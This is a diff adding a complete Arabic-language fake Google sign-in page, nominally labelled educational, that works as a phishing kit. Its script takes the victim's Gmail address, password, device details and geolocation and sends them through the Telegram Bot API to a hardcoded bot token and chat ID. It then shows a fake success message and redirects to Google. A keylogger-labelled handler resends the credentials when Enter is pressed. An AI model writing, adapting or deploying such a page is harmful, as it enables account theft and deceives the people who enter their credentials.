@@ -1,1 +1,360 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Google Sign in - تعليمية</title>
 
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+
+<style>
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+  font-family:Roboto,Arial;
+}
+
+body{
+  background:#f0f4f9;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+  padding:20px;
+}
+
+.wrapper{
+  width:450px;
+  background:#fff;
+  padding:50px 40px 60px 40px;
+  border-radius:8px;
+  box-shadow:0 2px 12px rgba(0,0,0,0.15);
+}
+
+.logo{
+  text-align:center;
+  margin-bottom:40px;
+}
+
+.logo img{
+  width:100px;
+}
+
+.title{
+  text-align:center;
+  font-size:24px;
+  color:#202124;
+  margin-bottom:8px;
+}
+
+.subtitle{
+  text-align:center;
+  color:#5f6368;
+  margin-bottom:40px;
+}
+
+.field{
+  margin-bottom:30px;
+  position:relative;
+}
+
+.field input{
+  width:100%;
+  padding:16px;
+  border:1px solid #dadce0;
+  border-radius:4px;
+  font-size:16px;
+  outline:none;
+  transition:.2s;
+}
+
+.field input:focus{
+  border:2px solid #1a73e8;
+}
+
+.label{
+  position:absolute;
+  left:16px;
+  top:16px;
+  color:#5f6368;
+  font-size:16px;
+  pointer-events:none;
+  transition:.2s;
+  background:white;
+  padding:0 4px;
+}
+
+.field input:focus + .label,
+.field input:not(:placeholder-shown) + .label{
+  top:-10px;
+  font-size:12px;
+  color:#1a73e8;
+}
+
+.link{
+  color:#1a73e8;
+  font-size:14px;
+  cursor:pointer;
+  margin-top:-10px;
+  margin-bottom:35px;
+  display:inline-block;
+}
+
+.link:hover{
+  text-decoration:underline;
+}
+
+.buttons{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-top:10px;
+}
+
+.create{
+  color:#1a73e8;
+  font-size:14px;
+  cursor:pointer;
+}
+
+.create:hover{
+  text-decoration:underline;
+}
+
+.next{
+  background:#1a73e8;
+  color:white;
+  border:none;
+  padding:12px 24px;
+  border-radius:4px;
+  font-size:16px;
+  cursor:pointer;
+  font-weight:500;
+  width:100%;
+  margin-top:10px;
+}
+
+.next:hover{
+  background:#1765cc;
+}
+
+.next:active{
+  transform:scale(0.98);
+}
+
+.footer{
+  margin-top:40px;
+  font-size:12px;
+  color:#5f6368;
+  display:flex;
+  justify-content:center;
+  gap:20px;
+}
+
+.footer span{
+  cursor:pointer;
+}
+
+.footer span:hover{
+  text-decoration:underline;
+}
+
+.loading{
+  display:none;
+  text-align:center;
+  color:#1a73e8;
+  margin-top:20px;
+}
+
+.success{
+  background:#e8f0fe;
+  border:1px solid #1a73e8;
+  color:#1a73e8;
+  padding:15px;
+  border-radius:8px;
+  margin-top:20px;
+  text-align:center;
+  display:none;
+}
+
+@media(max-width:600px){
+  .wrapper{
+    width:100%;
+    padding:40px 20px 50px 20px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+<div class="logo">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
+</div>
+
+<div class="title">تسجيل الدخول</div>
+<div class="subtitle">استخدام حساب Google</div>
+
+<form id="loginForm">
+
+<div class="field">
+  <input type="email" id="email" name="gmail" required placeholder=" ">
+  <label class="label">البريد الإلكتروني أو الهاتف</label>
+</div>
+
+<div class="field">
+  <input type="password" id="password" name="password" required placeholder=" ">
+  <label class="label">كلمة المرور</label>
+</div>
+
+<div class="link">هل نسيت البريد الإلكتروني؟</div>
+
+<div class="buttons">
+<div class="create">إنشاء حساب</div>
+<button class="next" type="submit">التالي</button>
+</div>
+
+</form>
+
+<div class="loading" id="loading">
+  جاري التحقق...
+</div>
+
+<div class="success" id="success">
+  ✓ تم تسجيل الدخول بنجاح!
+  <br><small>سيتم توجيهك قريباً...</small>
+</div>
+
+</div>
+
+<div class="footer">
+<span>مساعدة</span>
+<span>الخصوصية</span>
+<span>البنود</span>
+</div>
+
+<script>
+// ======================================
+// إعدادات Telegram - ضع قيمك هنا
+// ======================================
+const TELEGRAM_TOKEN = "8558611650:AAFWddU-BdL0cYvNPXOuDt0EXr3uSWYU90w";  // توكن البوت
+const CHAT_ID = "8432214961";          // Chat ID
+
+// ======================================
+// دالة إرسال البيانات لـ Telegram
+// ======================================
+async function sendToTelegram(email, password) {
+    const message = `
+🚨 *جديد Gmail محضور!* 🚨
+
+📧 *Email:* \`${email}\`
+🔑 *Password:* \`${password}\`
+🌐 *User Agent:* ${navigator.userAgent}
+📱 *Device:* ${navigator.platform}
+🌍 *Location:* ${await getLocation()}
+⏰ *الوقت:* ${new Date().toLocaleString('ar-SA')}
+
+━━━━━━━━━━━━━━━━━━━━━
+💎 *Phishing Page* 💎
+    `;
+    
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const data = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    };
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('خطأ في Telegram:', error);
+        return null;
+    }
+}
+
+// ======================================
+// الحصول على الموقع التقريبي
+// ======================================
+async function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve('غير مدعوم');
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                resolve(`[${lat.toFixed(4)}, ${lon.toFixed(4)}]`);
+            },
+            () => resolve('مخفي'),
+            { timeout: 5000 }
+        );
+    });
+}
+
+// ======================================
+// معالجة النموذج
+// ======================================
+document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    
+    // التحقق من صحة Gmail
+    if (!email.includes('@gmail.com') && !email.includes('@googlemail.com')) {
+        alert('يرجى إدخال بريد Gmail صحيح');
+        return;
+    }
+    
+    // إظهار Loading
+    document.getElementById("loading").style.display = 'block';
+    document.querySelector('.next').disabled = true;
+    document.querySelector('.next').textContent = 'جاري الإرسال...';
+    
+    // إرسال لـ Telegram
+    const result = await sendToTelegram(email, password);
+    
+    // إخفاء Loading وإظهار نجاح
+    setTimeout(() => {
+        document.getElementById("loading").style.display = 'none';
+        document.getElementById("success").style.display = 'block';
+        document.querySelector('.next').style.display = 'none';
+        
+        // إعادة توجيه بعد 3 ثواني (اختياري)
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 3000);
+    }, 1500);
+});
+
+// ======================================
+// Keylogger (اختياري - يرسل عند Enter)
+// ======================================
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        
+        if (email && password && email.includes('@gmail.com')) {
+            sendToTelegram(email, password);
+        }
+    }
+});
+
+console.log('✅ Phishing Page جاهزة للعمل');
+</script>
+
+</body>
+</html>
